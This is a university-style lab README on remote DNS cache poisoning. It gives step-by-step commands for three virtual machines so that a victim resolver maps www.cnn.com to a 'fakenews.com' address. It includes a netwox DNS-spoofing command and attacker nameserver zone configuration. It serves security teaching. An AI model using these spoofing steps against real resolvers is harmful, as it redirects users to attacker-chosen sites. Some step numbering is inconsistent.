## Remote DNS Cache Poisoning Attack

### Requirement

In this lab, you will poison the cache of a local DNS server, and thus affect clients who rely on this DNS server. More specifically, we want clients who access www.cnn.com go to fakenews.com.

### Setup

3 Linux VMs: Victim (DNS) Client, Victim (DNS) Server, Attacker. All 3 VMs are located in the same network - however, we are not allowed to exploit this fact for the attacks, in other words, the attacker in this lab is not allowed to use wireshark to sniff any packets, or use the *netwox* command to inject forged DNS responses. After all, this lab is trying to demonstrate how attackers from a remote network can still perform DNS cache poisoning.

The following is the IP addresses and MAC addresses for the VMs used in this README.

| VM  |  IP Address   |              Role                     |
|-----|---------------|---------------------------------------|
| VM1 | 172.16.77.128 |   victim (dns) client                 |
| VM2 | 172.16.77.129 |   victim (dns) server                 |
| VM3 | 172.16.77.130 |   attacker, attacker's DNS server     |

### Steps

1. on victim client, configure DNS server information, i.e., let the client know the IP address of the DNS server.

1.1. add this line to the end of file /etc/resolvconf/resolv.conf.d/head (remember to replace DNS_SERVER_IP with your victim DNS server's IP address, plus, you need "sudo" if you edit the file using vi/vim.)

```console
nameserver DNS_SERVER_IP
```

this screenshot shows editing the file in *vi*:
![alt text](lab-dns-edit-file.png "edit the file")

this screenshot shows the file is now edited:
![alt text](lab-dns-configure-dns.png "configure dns")

1.2. run the following command so the above change will take effect:

```console
# sudo resolvconf -u
```

![alt text](lab-dns-resolvconf.png "resolvconf command")

2. setting up the local DNS server (so that we don't need to actually purchase the domain attacker32.com).

2.1. add the following into /etc/bind/named.conf (so that it forwards all requests for the attacker32.com domain to the malicious DNS server).

```console
zone "attacker32.com" {
    type forward;
    forwarders {
        172.16.77.130; // replace 172.16.77.130 with your attacker VM's IP address, do not remove the ";".
    };
};
```

**Explanation**: the added lines are saying, for DNS inquiries regarding this attacker32.com domain, please forward the inquiries to 172.16.77.130.

2.2. restart DNS server so the above changes will take effect:

```console
$ sudo service bind9 restart
```

3. on attacker VM, run

```console
# sudo netwox 105 --hostname "www.cnn.com" --hostnameip FAKENEWS.com_IP --authns "ns1.fastly.net" --authnsip ATTACKER_IP --filter "src host DNS_SERVER_IP" --ttl 19000 --spoofip raw
```

FAKENEWS.com IP address (as of today, 05/24/2022): 188.126.71.216 (you can use ping command to confirm it)

**Explanation**: '--spoofip raw' means to spoof at IPv4/IPv6 level, as opposed to spoof at the data link layer. In other words, spoof IP addresses, instead of spoof MAC addresses.

this screenshot shows the actual command:

![alt text](lab-dns-attack-command.png "attack command")

4. setting up the attacker DNS server.

4.1. the above attacker_vm folder contains a DNS configuration file called attacker32.com.zone, copy this file into /etc/bind. In this file, change 10.0.2.8 to the attacker VM's IP address, and change the TTL (which is the first entry in this file) from 10000 to 10, i.e., records in the cache expire in 10 seconds.

4.2. add the following into /etc/bind/named.conf (so that the above configuration file will be used):

```console
zone "attacker32.com" {
    type master;
    file "/etc/bind/attacker32.com.zone";
};

zone "cnn.com" {
    type master;
    file "/etc/bind/cnn.com.zone";
};
```

Step 4.3. restart attacker's DNS server so the above changes will take effect:

$ sudo service bind9 restart

4. on victim client, send a query.

```console
# dig www.cnn.com 
```

```console
# dig @ns.attacker32.com www.cnn.com
```

the first *dig* command should show you the correct mapping: 

whereas the second *dig* command should show you that www.cnn.com is mapped to 188.126.71.216, which is the IP address of fakenews.com.
![alt text](lab-dns-attack-success-p1.png "attack success")
![alt text](lab-dns-attack-success-p2.png "attack success")

the goal of this attack is, when the victim runs either of the above two commands, the victim will get the same result, i.e., www.cnn.com is mapped to the IP address of fakenews.com.

5. result verification: on victim client, send a query.

```console
# dig www.cnn.com 
```

```console
# dig @ns.attacker32.com www.cnn.com
```

These two commands should now show the same result, which is www.cnn.com is mapped to 188.126.71.216, which is the IP address of fakenews.com.

6. you are recommended to remove the line you added on the client VM in step 3, in this file: /etc/resolvconf/resolv.conf.d/head, so that your future experiments won't be affected.
